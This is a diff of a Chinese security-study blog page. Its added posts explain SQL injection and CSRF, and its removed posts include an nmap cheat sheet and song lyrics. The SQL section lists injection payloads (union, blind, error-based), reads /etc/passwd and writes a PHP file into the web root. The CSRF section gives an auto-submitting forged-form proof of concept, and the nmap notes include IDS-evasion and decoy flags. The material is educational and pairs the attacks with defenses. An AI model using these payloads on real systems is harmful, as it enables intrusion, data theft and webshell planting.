+      
+        <p>sql注入是一种把sql代码插入到url或web表单请求的参数中，之后再将这些参数传递给后台的SQL服务器解析并执行。最终达到欺骗服务器执行恶意的sql代码。</p>
+<p>产生原因：SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤转义字符处理不合适；⑥多个提交处理不当。</p>
+<p>利用：可以利用sql注入获取数据包括用户数据后台管理账号密码等，如果有读写权限并知道网站的绝对路径，还可以load_file()读取文件内容、into outfile 写入webshell进行攻击，</p>
+<p>利用手法：</p>
+<ul>
+<li>url判断注入：<pre><code>and 1=1 / and 1=2 回显页面不同(整型判断)
+单引号‘显示数据库错误信息(整型、字符串类型判断) 
++1/-1回显上个页面（整型判断）
+and sleep(5) （判断网页返回时间）
+</code></pre></li>
+<li>读取文件： select load_file(‘/etc/passwd’)<pre><code>select load_file(&apos;D://xxxxx//phpstudy//WWW//1.txt&apos;)
+</code></pre></li>
+<li>写入：select ‘&lt;?php phpinfo(); ?&gt;’ into outfile ‘D://xxxxx//phpstudy//WWW//121.php’<pre><code>select &apos;&lt;?php phpinfo(); ?&gt;&apos; INTO OUTFILE &apos;/var/www/html/webshell.php&apos;;
+</code></pre></li>
+<li>获取绝对路径：php报错显示绝对路径、load_file()读取配置文件、phpinfo.php </li>
+</ul>
+<p>根据sql数据类型分类：</p>
+<ul>
+<li>字符串类型注入和整型注入、搜索类型注入</li>
+</ul>
+<p>根据注入语法注入：</p>
+<ul>
+<li>可联合查询注入：有显示位<pre><code>order by 判断列数
+union 1，2，3 判断显示位
+</code></pre>  例：<pre><code>?id=-1&apos;  union select 1,2,(select versraion()) --+
+?id=-1&apos;  union select 1,2,(select  group_concat(distinct table_schema) from information_schema.columns) --+                   
+</code></pre></li>
+<li><p>布尔型注入:页面存在注入，没有显示位，没有数据库出错信息，只能通过页面返回正常不正常进行判断来sql注入 </p>
+<pre><code>exists():检查子查询是否有返回值，返回True或False
+ascii():返回字符串str的最左边字符的ascii代码值，
+substr(string,numstart,numlength):
+</code></pre><p>  例：<br>  判断有多少个数据库：</p>
+<pre><code>?id=1&apos; and ((select count(distinct table_schema) from information_schema.columns)&gt;8) --+
+</code></pre><p>  查看第一个数据库字段的长度：</p>
+<pre><code>?id=1&apos; and (select length((select distinct table_schema from information_schema.columns limit 0,1))&gt;17)
+</code></pre><p>  查看第一个数据库的第一个字符的ascii码：</p>
+<pre><code>?id=1&apos; and (select ascii(substr((select distinct table_schema from information_schema.columns limit 0,1),1,1))&gt;104) --+
 </code></pre></li>
 </ul>
+<ul>
+<li>报错注入：有报错信息 mysql_error()<pre><code>count(*)
+concat()
+(floor(rand(0)*2))a
+group by a
+</code></pre>  例：<br>  查看版本信息：<pre><code>?id=1&apos; union select 1,count(*),concat(version(),0x7e,floor(rand(0)*2))x from information_schema.columns group by x --+
+</code></pre>  查看有多少个库：<pre><code>?id=1&apos; union select 1,count(*),concat((select count( distinct table_schema) from information_schema.columns),0x7e,floor(rand(0)*2))x from information_schema.columns group by  x--+
+</code></pre>  查询数据库名(limit)<pre><code>(select distinct table_schema from information_schema.columns limit 1,1)
+</code></pre></li>
+</ul>
+<ul>
+<li>可多语句查询注入：<pre><code>sqlserver数据库
+例：http://hello.com/view?id=1;update t1 set content =&apos;aaaaaaaaa&apos;
+</code></pre></li>
+<li>基于时间延迟注入：<pre><code>sleep()
+</code></pre></li>
+<li>偏移注入、宽字节注入、二次注入</li>
+</ul>
+<p>防御：<br>     1.永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和双”-“进行转换等。<br>     2.永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。<br>     3.永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。<br>     4.不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。<br>     5.应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装<br>     6.sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFTSCAN等。采用MDCSOFT-IPS可以有效的防御SQL注入，XSS攻击等。</p>
 <p><br></p>
-<h3 id="Target"><a href="#Target" class="headerlink" title="Target:"></a>Target:</h3><p>-u RUL 指定目标地址</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/16/read_sqlmap/" data-id="cit8bn83f0005zcqvuwztuz0n" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/30/SQL注入/" data-id="cit8bqrk70000ncqvert9n5db" class="article-share-link">Share</a>
       
       
     </footer>
@@ -427,10 +626,10 @@ group by a
 
 
   
-    <article id="post-需要复习的知识" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-CSRF" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2016/08/16/需要复习的知识/" class="article-date">
-  <time datetime="2016-08-16T07:50:28.000Z" itemprop="datePublished">2016-08-16</time>
+    <a href="/2016/08/30/CSRF/" class="article-date">
+  <time datetime="2016-08-30T04:12:12.000Z" itemprop="datePublished">2016-08-30</time>
 </a>
     
   </div>
@@ -441,7 +640,7 @@ group by a
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/16/需要复习的知识/">需要掌握的知识</a>
+      <a class="article-title" href="/2016/08/30/CSRF/">CSRF</a>
     </h1>
   
 
@@ -449,168 +648,42 @@ group by a
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞:"></a>常见漏洞:</h3><ul>
-<li>SQL 注入</li>
-<li>xss</li>
-<li>csrf</li>
-<li>ssrf</li>
-<li>任意文件命令执行</li>
-<li>任意代码执行</li>
-<li>任意文件包含</li>
-<li>任意文件上传</li>
-<li>任意文件查看与下载</li>
-<li>敏感信息泄漏</li>
-<li>逻辑漏洞<blockquote>
-<p>是什么？产生原因，怎样利用，各种利用手法，怎么修复</p>
-</blockquote>
-</li>
+        <p>CSRF是指跨站请求伪造：</p>
+<ul>
+<li>csrf的攻击建立在浏览器与web服务器的会话中；</li>
+<li>欺骗用户访问URL。</li>
 </ul>
-<h3 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h3><p><a href="http://navisec.it/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%86%8C/" target="_blank" rel="external">编辑器漏洞总结</a></p>
-<h3 id="常见服务漏洞："><a href="#常见服务漏洞：" class="headerlink" title="常见服务漏洞："></a>常见服务漏洞：</h3><ul>
-<li>tomcat</li>
-<li>jboss</li>
-<li>redis</li>
-<li>Elasticsearch </li>
-<li>等等</li>
-</ul>
-<h3 id="java反序列化漏洞"><a href="#java反序列化漏洞" class="headerlink" title="java反序列化漏洞"></a>java反序列化漏洞</h3><p><a href="https://blog.chaitin.com/2015-11-11_java_unserialize_rce/?from=timeline&amp;isappinstalled=0" target="_blank" rel="external">java反序列化漏洞</a></p>
-<h3 id="struts2漏洞"><a href="#struts2漏洞" class="headerlink" title="struts2漏洞"></a>struts2漏洞</h3><p><a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="external">Struts2 历史 RCE 漏洞回顾不完全系列
-</a></p>
-<h3 id="WebShell的获取与查杀"><a href="#WebShell的获取与查杀" class="headerlink" title="WebShell的获取与查杀"></a>WebShell的获取与查杀</h3><h3 id="Windows、Linux-系统提权"><a href="#Windows、Linux-系统提权" class="headerlink" title="Windows、Linux 系统提权"></a>Windows、Linux 系统提权</h3><h3 id="企业级渗透测试流程"><a href="#企业级渗透测试流程" class="headerlink" title="企业级渗透测试流程"></a>企业级渗透测试流程</h3>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/16/需要复习的知识/" data-id="cit8bn83p0007zcqvhwx741rv" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
+<p>产生原因：<br>    CSRF攻击依赖下面的假定：<br>    攻击者了解受害者所在的站点<br>    攻击者的目标站点具有持久化授权cookie或者受害者具有当前会话cookie<br>    目标站点没有对用户在网站行为的第二授权</p>
+<p>CSRF攻击是黑客借助受害者的cookie骗取服务器的信任，但是黑客并不能获取到用户的cookie，也不能看到cookie的内容。另外，由于同源策略的限制，黑客无法从返回的结果中得到任何的东西，csrf所能做的就是给服务器发送请求。</p>
+<p>get类型和post类型<br>利用csrf进行收听传播：<br>直接构造url：例如：http：//www.xxser.com/listen?listenid=8888   //listenid被收听用户ID<br>利用csrf进行转账：<br><a href="http://www.secbug.org/pay.jsp?user=xxer&amp;money=10000" target="_blank" rel="external">http://www.secbug.org/pay.jsp?user=xxer&amp;money=10000</a>            //xxer为攻击者账号</p>
+<p>post接受收听用户：</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;post data&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form id=&quot;myfrom&quot; method=&quot;post&quot; action=&quot;http://www.xxser.com/publish&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;listenid&quot; value=&quot;8888&quot;&gt;
 
+&lt;/form&gt;
 
-  
-    <article id="post-nmap常用命令" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/08/11/nmap常用命令/" class="article-date">
-  <time datetime="2016-08-11T11:47:38.000Z" itemprop="datePublished">2016-08-11</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/11/nmap常用命令/">Read_nmap</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="导语："><a href="#导语：" class="headerlink" title="导语："></a>导语：</h4><p>nmap的英文全称是”Network Mapper”,nmap可以用来快速地扫描大型网络或单个主机。nmap主要有四个方面的扫描功能：主机发现、端口扫描、应用与版本侦测、操作系统侦测</p>
-<p><br></p>
-<h3 id="主机发现："><a href="#主机发现：" class="headerlink" title="主机发现："></a>主机发现：</h3><p>nmap -sn 192.168.1.100-200 //扫描局域网192.168.1.100-192.168.1.200范围内活动的IP主机<br>nmap -v //显示过程<br>nmap -A //进行完整全面的扫描：主机发现、端口扫描、应用与版本侦测、操作系统侦测<br>nmap -n/-R //不进行DNS解析/总是解析<br>nmap -iL   –指定ip.txt</p>
-<h3 id="端口扫描："><a href="#端口扫描：" class="headerlink" title="端口扫描："></a>端口扫描：</h3><ul>
-<li>nmap -sS            #使用TCP SYN方式对目标主机进行扫描TCP端口</li>
-<li>nmap -sU            #使用UDP扫描方式确定主机UDP端口</li>
-<li>nmap -F            #快速扫描TOP100的端口</li>
-<li>nmap -Pn            #跳过主机发现进行端口扫描</li>
-<li>nmap -p 3389        #扫描指定的3389端口是否开放</li>
-<li>nmap –traceroute    #追踪路由节点</li>
-<li>nmap –top-ports 100    #扫描开放概率最高的前100个端口</li>
-</ul>
-<pre><code>例：nmap -sS -sU --top-ports 100 192168.136.86
-</code></pre><h3 id="版本侦测："><a href="#版本侦测：" class="headerlink" title="版本侦测："></a>版本侦测：</h3><ul>
-<li>nmap -sV                #进行版本侦测</li>
-<li>nmap –version-all        #尝试使用所有的probes进行侦测 （intensity 9)</li>
-<li>nmap –version-trace    #显示详细的侦测过程信息</li>
-</ul>
-<h3 id="操作系统侦测："><a href="#操作系统侦测：" class="headerlink" title="操作系统侦测："></a>操作系统侦测：</h3><ul>
-<li>nmap -O                 #进行操作系统侦测</li>
-</ul>
-<p><br></p>
-<h2 id="nmap进阶使用："><a href="#nmap进阶使用：" class="headerlink" title="nmap进阶使用："></a>nmap进阶使用：</h2><h5 id="防火墙-IDS规避"><a href="#防火墙-IDS规避" class="headerlink" title="防火墙/IDS规避"></a>防火墙/IDS规避</h5><h5 id="规避原理：1、分片；2、IP诱骗；3、IP伪装；4、指定源端口；5、扫描延时；"><a href="#规避原理：1、分片；2、IP诱骗；3、IP伪装；4、指定源端口；5、扫描延时；" class="headerlink" title="规避原理：1、分片；2、IP诱骗；3、IP伪装；4、指定源端口；5、扫描延时；"></a>规避原理：1、分片；2、IP诱骗；3、IP伪装；4、指定源端口；5、扫描延时；</h5><ul>
-<li>-f                                     #使用分片？？？？不太懂。。。</li>
-<li>-D<192.168.1.1,192,168,1,2,me>        #IP诱骗    ME为自己的IP</192.168.1.1,192,168,1,2,me></li>
-<li>-S<192.168.33.55>                    #IP伪装    伪装成其他IP</192.168.33.55></li>
-<li>-g 3355                                #指定源端口     表示自己的端口使用3355</li>
-<li>-e echo                                #使用echo网卡发送数据包    </li>
-</ul>
-<pre><code>例：nmap -v -F -Pn -D 192.168.1.2,192.168.4.6,ME -g 3355 127.0.0.1
-    显示过程信息，-F快速扫描top100的端口，-D使用ip诱骗掩饰自己真实IP（ME为自己IP），-g 3355使用自己的3355端口 127.0.0.1为扫描的目标IP.
-</code></pre><h3 id="数据库渗透测试："><a href="#数据库渗透测试：" class="headerlink" title="数据库渗透测试："></a>数据库渗透测试：</h3><ul>
-<li>nmap -p 3306 –script mysql-databases –script-args mysqluser=root,mysqlpass 127.0.0.1         </li>
-</ul>
-<h3 id="列举目标数据库："><a href="#列举目标数据库：" class="headerlink" title="列举目标数据库："></a>列举目标数据库：</h3><ul>
-<li>nmap -p 3306 –script=mysql-empty-password 123.206.9.45         #检查目标mysql密码</li>
-</ul>
-<h3 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h3><ul>
-<li><p>nmap –script ip-geolocation-* www.baidu.com     #IP地址收集 收集www.baidu.com域名包含的IP信息</p>
-</li>
-<li><p>nmap –script hostmap-ip2hosts     baidu.com         #IP反查 可以将所有绑定在该IP上的域名显示出来</p>
-</li>
-<li><p>nmap –script dns-brute baidu.com                         #DNS信息收集</p>
-</li>
-<li><p>nmap –script smb-check-vulns.nse -p 445 127.0.0.1         #对SMB漏洞进行扫描</p>
-</li>
-<li><p>nmap –script external baidu.com                         #Whois查询</p>
-</li>
-</ul>
+&lt;script&gt;
+    var myfrom = document.getElementById(&quot;myfrom&quot;) ;
+    myfrom.submit();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>在这段代码中构造一个form表单，然后利用javascript自动提交表单。这样只要一打这个网页，就会自动提交POST数据。</p>
+<p>浏览器的Cookie机制：<br>    Cookie有两种表现形式：一种是本地Cookie，称之为持久性Cookie；另一种则是临时Cookie，称为Session Cookie。本地Cookie是服务端向客户端发送Cookie时制定了时效，Expire字段，存储于本地。当Expire所制定的时效过期后，Cookie将失效。Session Cookie则没有Expire时效，存储在浏览器内存中，当浏览器关闭后，Session Cookie也随之失效。<br>每个浏览器的Cookie机制不一样。有的浏览器并不发送Cookie。不发送Cookie的浏览器，攻击将会失败。所以测试时候，浏览器的选择业非常重要。</p>
+<p>检查CSRF:<br>    CSRF只能通过用户正当的操作进行攻击，即劫持用户操作。所以在检测时候，首先要确定Web应用程序的所有功能，以及哪些操作是敏感操作，比如修改密码，转账，发表留言等。<br>    确定了敏感操作，编写POC，使用这个poc提交请求。如果操作成功，即存在CSRF漏洞。<br>    CSRF漏洞可以理解为：服务器有没有执行POC的请求,如果执行，则代表存在CSRF漏洞。</p>
+<pre><code>半自动化检测工具：CSRFTester。是OWASP组织提供的一款半自动CSRF漏洞测试工具。
+</code></pre><p>CSRF的防御：<br>    1、二次确认 2、Token认证<br>    注:如果一个网站同时存在XSS和CSRF漏洞时，防范CSRF是没有任何意义的，因为XSS获取webshell不就是XSS与CSRF吗？</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/11/nmap常用命令/" data-id="cit8bn8330003zcqvr870hx7b" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-sugar" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/08/11/sugar/" class="article-date">
-  <time datetime="2016-08-11T11:47:38.000Z" itemprop="datePublished">2016-08-11</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/11/sugar/">sugar</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Sugar<br>演唱：Maroon 5</p>
-<p>I’m hurtin baby, I’m broken down<br>I need your lovin, lovin I need it now<br>When I’m without ya, I’m somethin weak<br>Ya got me beggin beggin, I’m on my knees</p>
-<p>I don’t wanna be needin your love<br>I just wanna be deep in your love<br>And it’s killin me when you’re away (ohh baby)<br>Cause I really don’t care where you are<br>I just wanna be there where you are<br>And I gotta get one little taste</p>
-<p>Your sugar yes please won’t you come and put it down on me<br>I’m right here cause I need little love a little sympathy<br>Ya you show me good lovin make it alright<br>Need a little sweetness in my life<br>Your sugar yes please won’t you come and put it down on me</p>
-<p>My broken pieces you pick them up<br>Don’t leave me hangin hangin come give me some<br>When I’m without ya so insecure<br>You are the one thing one thing I’m livin for</p>
-<p>I don’t wanna be needin your love<br>I just wanna be deep in your love<br>And it’s killin me when you’re away (ohh baby)<br>Cause I really don’t care where you are<br>I just wanna be there where you are<br>And I gotta get one little taste</p>
-<p>Your sugar yes please won’t you come and put it down on me<br>I’m right here cause I need little love a little sympathy<br>Ya you show me good lovin make it alright<br>Need a little sweetness in my life<br>Your sugar yes please won’t you come and pour it down on me</p>
-<p>I want that red velvet I want that sugar sweet<br>Don’t let nobody touch it unless that somebody’s me<br>I gotta be your man there ain’t no other way<br>Cause girl you’re hotter than a southern California day<br>I don’t wanna play no games you don’t gotta be afraid<br>Don’t give me all that shy shit no make up on that’s my (sugar)</p>
-<p>Sugar yes please won’t you come and put it down on me<br>I’m right here cause I need little love a little sympathy<br>Ya you show me good lovin make it alright<br>Need a little sweetness in my life<br>Your sugar yes please won’t you come and put it down on me<br>Sugar yes please won’t you come and put it down on me<br>I’m right here cause I need little love a little sympathy<br>Ya you show me good lovin make it alright<br>Need a little sweetness in my life<br>Your sugar yes please won’t you come and put it down on me</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/11/sugar/" data-id="cit8bn8360004zcqv53it7o8e" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/30/CSRF/" data-id="cit8bqrk70001ncqvrw73kd57" class="article-share-link">Share</a>
       
       
     </footer>
@@ -621,6 +694,10 @@ group by a
 
   
 
+
+  <nav id="page-nav">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">__('next') &raquo;</a>
+  </nav>
 </section>
         
           <aside id="sidebar">
@@ -637,7 +714,7 @@ group by a
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li></ul>
     </div>
   </div>
 
@@ -650,7 +727,11 @@ group by a
       <ul>
         
           <li>
-            <a href="/2016/08/30/CSRF/">CSRF</a>
+            <a href="/2016/09/21/安全配置与中间件漏洞/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2016/08/30/SSRF/">SSRF</a>
           </li>
         
           <li>
@@ -658,15 +739,11 @@ group by a
           </li>
         
           <li>
-            <a href="/2016/08/30/SQL注入/">SQL 注入</a>
+            <a href="/2016/08/30/文件包含漏洞/">文件包含漏洞</a>
           </li>
         
           <li>
-            <a href="/2016/08/30/注入练习/">注入练习</a>
-          </li>
-        
-          <li>
-            <a href="/2016/08/16/read_sqlmap/">Read_Sqlmap</a>
+            <a href="/2016/08/30/任意文件查看与下载漏洞/">任意文件查看与下载漏洞</a>
           </li>
         
       </ul>
